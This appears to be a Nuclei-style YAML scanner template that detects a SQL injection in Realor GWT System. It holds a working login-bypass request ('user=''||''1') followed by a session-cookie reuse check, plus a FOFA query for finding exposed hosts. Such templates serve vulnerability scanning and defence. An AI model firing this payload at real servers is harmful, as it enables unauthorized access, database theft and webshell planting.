http:
- extractors:
  - group: 1
    internal: true
    name: cookie
    part: header
    regex:
    - PHPSESSID=(.*?);
    type: regex
  matchers:
  - condition: and
    dsl:
    - contains(body_1,"CustomInfo") && contains(header_1,"PHPSESSID")
    - contains(body_2,"src=\"custom/")
    type: dsl
  raw:
  - 'GET /AgentBoard.XGI?user=''||''1&cmd=UserLogin HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /Board.XGI HTTP/1.1

    Cookie: PHPSESSID={{cookie}}

    Host: {{Hostname}}

    '
id: realor-gwt-system-sqli
info:
  author: SleepingBag945
  description: 'Realor GWT System system improperly handles the security of data passed
    by users, resulting in a SQL injection vulnerability. Remote and unauthorized
    attackers can use this vulnerability to obtain sensitive information in the database,
    and can further write webshell backdoors. Access, the attacker can execute arbitrary
    malicious code on the target server and gain system privileges.

    '
  metadata:
    fofa-query: "app=\"REALOR-\u5929\u7FFC\u5E94\u7528\u865A\u62DF\u5316\u7CFB\u7EDF\
      \""
    max-request: 2
    verified: 'true'
  name: Realor GWT System SQL injection
  reference:
  - https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/realor-gwt-system-sql-injection.yaml
  severity: high
  tags: realor,sqli,vuln
